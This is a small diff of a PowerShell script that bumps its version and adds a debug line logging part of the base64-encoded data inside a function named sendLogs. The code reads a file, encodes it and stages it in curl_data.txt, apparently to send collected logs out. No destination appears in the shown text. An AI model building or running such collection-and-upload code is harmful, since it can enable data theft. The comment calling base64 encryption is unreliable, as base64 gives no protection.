@@ -1,4 +1,4 @@
-## VERSION 1.2.3
+## VERSION 1.2.4
 
 $log = "C:\Users\Public\log.txt"
 $zip = "C:\Users\Public\link.zip"
@@ -112,6 +112,8 @@ function sendLogs($logsPath) {
         # Encrypts data for security
         $bytes = [System.IO.File]::ReadAllBytes($logsPath)
         $protected = [Convert]::ToBase64String($bytes)
+
+        "Sending encoded data (first 100 chars): $($protected.Substring(0,100))..." | Out-File -Append -FilePath $log
 
         # Writes base64 string to a temp file
         $tempDataFile = "$env:TEMP\curl_data.txt"
